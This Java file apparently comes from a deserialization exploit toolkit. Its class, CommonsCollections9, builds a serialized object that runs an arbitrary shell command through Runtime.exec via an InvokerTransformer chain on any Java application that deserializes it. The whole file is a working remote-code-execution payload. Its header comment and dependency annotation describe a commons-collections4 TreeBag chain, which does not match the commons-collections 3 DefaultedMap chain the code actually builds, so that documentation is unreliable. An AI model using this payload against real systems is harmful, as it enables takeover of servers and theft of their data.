package payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.Gadgets;
import util.PayloadRunner;
import util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;
import java.util.Map;

/*
Gadget chain:
    org.apache.commons.collections4.bag.TreeBag.readObject
    org.apache.commons.collections4.bag.AbstractMapBag.doReadObject
    java.util.TreeMap.put
    java.util.TreeMap.compare
    org.apache.commons.collections4.comparators.TransformingComparator.compare
    org.apache.commons.collections4.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer
        ... (TemplatesImpl gadget)
    java.lang.Runtime.exec
*/
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({Authors.CCKUAILONG})

public class CommonsCollections9 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

    public BadAttributeValueExpException getObject(String command) throws Exception {
        String[]                      execArgs           = {command};
        ChainedTransformer            chainedTransformer = new ChainedTransformer(new Transformer[]{(Transformer) new ConstantTransformer(Integer.valueOf(1))});
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };
        Map<Object, Object>           innerMap           = new HashMap<Object, Object>();
        Map defaultedmap       = DefaultedMap.decorate(innerMap, (Transformer) chainedTransformer);
        TiedMapEntry                  entry              = new TiedMapEntry(defaultedmap, "nu1r");
        BadAttributeValueExpException val                = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(val, "val", entry);
        Reflections.setFieldValue(chainedTransformer, "iTransformers", transformers);
        return val;
    }

    public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
        return PayloadRunner.run(CommonsCollections9.class, command, fusion);
    }
}
